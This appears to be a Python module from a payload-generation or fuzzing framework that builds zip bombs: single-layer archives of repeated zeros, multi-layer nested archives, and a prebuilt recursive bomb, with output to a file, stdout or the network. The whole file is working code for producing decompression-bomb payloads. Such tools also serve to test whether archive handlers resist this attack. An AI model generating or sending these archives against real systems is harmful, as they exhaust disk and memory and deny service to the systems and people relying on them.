import os
import io
import math
import zipfile

from options import Options

options = Options()
options.add_option('type', 'recursive', 'Type of bomb', ['single_layer', 'layer', 'recursive'])
options.add_option('target_size', 100000,
                   'Desired size of decompressed file in bytes (not applicable to recursive bombs)')
options.add_option('n_layers', 3,
                   'Desired size of decompressed file in bytes (only relevant for layer bombs)')

# TODO - description of exploit


DESCRIPTION = 'Produces a zip archive that expands into a very large file or set of files'


def run(generator, output):

    if output.OUTPUT_NAME not in ["file", "stdout", "network"]:
        raise ValueError("Unsupported output type for zip bomb.")

    if output.OUTPUT_NAME == "file" and output.options["format"] != "binary":
        raise ValueError("Only binary files are supported for output.")

    if options['type'] == 'recursive':
        with open(os.path.dirname(os.path.realpath(__file__)) + '/bombs-DONOTOPEN/zip_recursive.zip', 'rb') as f:
            zip_contents = f.read()
        output.output([zip_contents])

    elif options['type'] == 'single_layer':
        zip_contents = singlelayerbomb(options['target_size'])
        output.output([zip_contents])

    elif options['type'] == 'layer':
        zip_contents = layerzipbomb(options['target_size'], options['n_layers'])
        output.output([zip_contents])


def make_copies_and_compress(contents, n_copies):
    with io.BytesIO() as memfile:
        with zipfile.ZipFile(memfile, 'w', zipfile.ZIP_DEFLATED) as f:
            for i in range(n_copies):
                f.writestr('file_{}.zip'.format(i), contents)
        return memfile.getvalue()


def layerzipbomb(target_size, n_layers, base_file_size=100000):
    n_files = math.ceil(target_size / base_file_size)
    files_per_layer = math.ceil(n_files ** (1 / n_layers))

    zip_contents = singlelayerbomb(files_per_layer * base_file_size, base_file_size)

    for i in range(n_layers):
        zip_contents = make_copies_and_compress(zip_contents, files_per_layer)

    return zip_contents


def singlelayerbomb(target_size, file_size=100000):
    # io.BytesIO object allows for writing large files to gzip without consuming copious amounts of memory
    with io.BytesIO() as memfile:
        with zipfile.ZipFile(memfile, 'w', zipfile.ZIP_DEFLATED) as f:
            for i in range(target_size // file_size):
                f.writestr('file_{}'.format(i), '0' * file_size)
            f.writestr('file_{}'.format(target_size // file_size), '0' * (target_size % file_size))
        return memfile.getvalue()


